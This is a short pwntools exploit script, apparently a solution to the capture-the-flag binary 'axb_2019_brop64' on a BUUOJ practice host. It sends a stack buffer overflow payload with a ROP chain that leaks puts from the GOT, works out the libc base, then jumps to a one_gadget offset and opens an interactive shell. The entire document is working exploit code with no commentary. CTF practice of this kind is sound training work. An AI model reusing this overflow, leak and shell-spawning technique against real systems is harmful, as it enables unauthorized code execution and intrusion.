from pwn import *
r = remote('node3.buuoj.cn',26021)
elf = ELF('./axb_2019_brop64')
libc = ELF('/libc-2.23.so')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi_ret = 0x400963
main = 0x4007D6
payload = 'a'*0xd8+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)
r.sendline(payload)
puts_leak = u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc_base = puts_leak - libc.sym['puts']
log.success(hex(libc_base))
one = libc_base+0x45216 
payload = 'a'*0xd8+p64(one)
r.sendline(payload)
r.interactive()